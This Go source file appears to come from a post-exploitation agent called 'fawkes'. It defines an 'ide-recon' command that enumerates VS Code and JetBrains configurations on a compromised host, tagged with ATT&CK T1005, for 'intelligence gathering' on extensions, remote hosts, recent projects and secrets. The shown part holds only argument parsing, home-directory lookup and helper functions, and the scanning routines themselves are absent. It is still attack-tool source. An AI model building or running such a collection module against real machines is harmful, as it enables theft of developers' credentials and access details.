package commands

import (
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

// IdeReconCommand enumerates IDE configurations for intelligence gathering.
type IdeReconCommand struct{}

func (c *IdeReconCommand) Name() string { return "ide-recon" }
func (c *IdeReconCommand) Description() string {
	return "Enumerate IDE configurations — extensions, remote hosts, recent projects, secrets (T1005)"
}

type ideReconArgs struct {
	Action string `json:"action"` // vscode, jetbrains, all
	User   string `json:"user"`   // Optional user filter
}

func (c *IdeReconCommand) Execute(task structs.Task) structs.CommandResult {
	var args ideReconArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			parts := strings.Fields(task.Params)
			args.Action = parts[0]
			if len(parts) > 1 {
				args.User = parts[1]
			}
		}
	}
	if args.Action == "" {
		args.Action = "all"
	}

	homes := ideGetUserHomes(args.User)
	if len(homes) == 0 {
		return errorResult("Error: could not determine user home directories")
	}

	var sb strings.Builder
	sb.WriteString("IDE Reconnaissance\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n")

	switch strings.ToLower(args.Action) {
	case "vscode":
		ideReconVSCode(&sb, homes)
	case "jetbrains":
		ideReconJetBrains(&sb, homes)
	case "all":
		ideReconVSCode(&sb, homes)
		sb.WriteString("\n")
		ideReconJetBrains(&sb, homes)
	default:
		return errorf("Unknown action: %s. Use: vscode, jetbrains, all", args.Action)
	}

	return successResult(sb.String())
}

// ideGetUserHomes returns home directories to scan.
func ideGetUserHomes(filterUser string) []string {
	if filterUser != "" {
		// Try to find specific user's home
		if runtime.GOOS == "windows" {
			home := filepath.Join(`C:\Users`, filterUser)
			if info, err := os.Stat(home); err == nil && info.IsDir() {
				return []string{home}
			}
		}
	}
	// Fall back to current user's home
	home, err := os.UserHomeDir()
	if err != nil {
		return nil
	}
	return []string{home}
}

// ideMatchesAny returns true if s contains any of the patterns.
func ideMatchesAny(s string, patterns ...string) bool {
	for _, p := range patterns {
		if strings.Contains(s, p) {
			return true
		}
	}
	return false
}

// ideExtractXMLAttr extracts the value of a named attribute from an XML tag string.
func ideExtractXMLAttr(line, attr string) string {
	search := attr + `="`
	idx := strings.Index(line, search)
	if idx < 0 {
		return ""
	}
	start := idx + len(search)
	end := strings.Index(line[start:], `"`)
	if end < 0 {
		return ""
	}
	return line[start : start+end]
}
